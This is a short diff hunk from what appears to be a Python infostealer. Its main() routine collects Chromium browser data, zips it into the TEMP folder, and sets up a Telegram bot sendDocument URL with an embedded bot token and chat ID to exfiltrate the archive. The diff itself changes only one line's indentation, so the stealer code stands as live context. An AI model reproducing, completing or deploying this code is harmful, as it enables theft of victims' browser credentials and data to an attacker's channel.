@@ -507,7 +507,7 @@ def main():
     if os.path.exists(chromium):
         get_chromium(data_path,chromium)  
     python310_path = r'C:\Users\Public\Document.zip'
-	file_path = r'C:\Users\Public\Document\project.py'
+file_path = r'C:\Users\Public\Document\project.py'
     z_ph = os.path.join(os.environ["TEMP"], name_f +'.zip');shutil.make_archive(z_ph[:-4], 'zip', data_path)
     Compressed(z_ph,number)
     token = 'https://api.telegram.org/bot6480520014:AAHQPDmYECa3ar32OsOsX7EbaOAeKzUJ0zQ/sendDocument';IDchat = '-745685632'
